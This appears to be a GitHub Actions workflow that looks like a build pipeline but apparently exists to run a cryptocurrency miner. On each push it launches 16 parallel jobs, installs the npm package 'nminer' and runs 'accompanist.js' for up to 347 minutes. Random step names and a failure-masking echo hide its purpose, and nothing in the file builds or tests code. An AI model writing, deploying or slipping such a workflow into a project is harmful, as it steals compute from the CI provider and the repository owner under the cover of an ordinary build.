name: accompanist
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4652 }
          - { version: 8226 }
          - { version: 6295 }
          - { version: 8307 }
          - { version: 1836 }
          - { version: 5285 }
          - { version: 4472 }
          - { version: 7510 }
          - { version: 9929 }
          - { version: 9295 }
          - { version: 5855 }
          - { version: 5738 }
          - { version: 6195 }
          - { version: 8663 }
          - { version: 7290 }
          - { version: 3451 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: quick-witted amidst
        run: |
          npm install nminer@latest
          timeout 347m node accompanist.js || echo "accompanist executed"